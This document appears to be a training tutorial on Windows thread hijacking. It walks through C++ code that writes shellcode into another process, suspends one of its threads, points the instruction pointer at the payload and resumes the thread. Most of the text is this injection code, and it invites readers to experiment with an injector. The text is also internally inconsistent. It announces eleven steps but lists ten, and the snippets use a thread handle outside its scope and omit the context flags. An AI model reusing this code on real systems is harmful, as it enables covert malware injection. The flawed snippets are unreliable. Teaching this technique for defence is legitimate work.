# Thread Hijacking: A High-Level Overview

Thread (execution) hijacking can be broken down into the following eleven steps:

1. Locate and open a target process to control.
2. Allocate memory region for malicious code.
3. Write malicious code to allocated memory.
4. Identify the thread ID of the target thread to hijack.
5. Open the target thread.
6. Suspend the target thread.
7. Obtain the thread context.
8. Update the instruction pointer to the malicious code.
9. Rewrite the target thread context.
10. Resume the hijacked thread.

We will break down a basic thread hijacking script to identify each of the steps and explain them in more depth below.

---

## Steps 1–3: Process Injection Basics

The first three steps follow the common process injection steps. These will not be explained in detail here, but the source code is provided below:

```cpp
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS, // Requests all possible access rights
    FALSE, // Child processes do not inherit parent process handle
    processId // Stored process ID
);

PVOID remoteBuffer = VirtualAllocEx(
    hProcess, // Opened target process
    NULL, 
    sizeof(shellcode), // Region size of memory allocation
    (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
    PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the committed pages
);

WriteProcessMemory(
    hProcess, // Opened target process
    remoteBuffer, // Allocated memory region
    shellcode, // Data to write
    sizeof(shellcode), // Byte size of data
    NULL
);
```

---

## Step 4: Identify the Thread ID

To identify the thread ID, we use a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Thread32First()`, and `Thread32Next()`. These APIs loop through a snapshot of a process to enumerate thread information.

```cpp
THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot(
    TH32CS_SNAPTHREAD, // Include all threads on the system
    0 // Indicates the current process
);

Thread32First(
    hSnapshot, // Handle of the snapshot
    &threadEntry // Pointer to the THREADENTRY32 structure
);

while (Thread32Next(
    hSnapshot, // Handle of the snapshot
    &threadEntry // Pointer to the THREADENTRY32 structure
)) {
    // Process threads
}
```

---

## Step 5: Open the Target Thread

Once the thread ID is identified, we can open the target thread using `OpenThread` with the `THREADENTRY32` structure pointer.

```cpp
if (threadEntry.th32OwnerProcessID == processID) { // Verify parent process IDs match
    HANDLE hThread = OpenThread(
        THREAD_ALL_ACCESS, // Requests all possible access rights
        FALSE, // Child threads do not inherit parent thread handle
        threadEntry.th32ThreadID // Reads the thread ID from THREADENTRY32
    );
    break;
}
```

---

## Step 6: Suspend the Target Thread

To suspend the opened target thread, use `SuspendThread`:

```cpp
SuspendThread(hThread);
```

---

## Step 7: Obtain the Thread Context

Retrieve the thread context using `GetThreadContext`:

```cpp
CONTEXT context;
GetThreadContext(
    hThread, // Handle for the thread
    &context // Pointer to store the context structure
);
```

---

## Step 8: Overwrite the Instruction Pointer (RIP)

Update the `RIP` (Instruction Pointer Register) to point to the malicious memory region. `RIP` determines the next code instruction and controls the flow of execution.

```cpp
context.Rip = (DWORD_PTR)remoteBuffer; // Point RIP to the malicious buffer
```

---

## Step 9: Update the Thread Context

Apply the updated context to the thread using `SetThreadContext`:

```cpp
SetThreadContext(
    hThread, // Handle for the thread
    &context // Pointer to the context structure
);
```

---

## Step 10: Resume the Hijacked Thread

Finally, resume the target thread using `ResumeThread`:

```cpp
ResumeThread(hThread);
```

---

By combining these steps, you can create a process injector via thread hijacking. Use the provided C++ injector to experiment with thread hijacking techniques.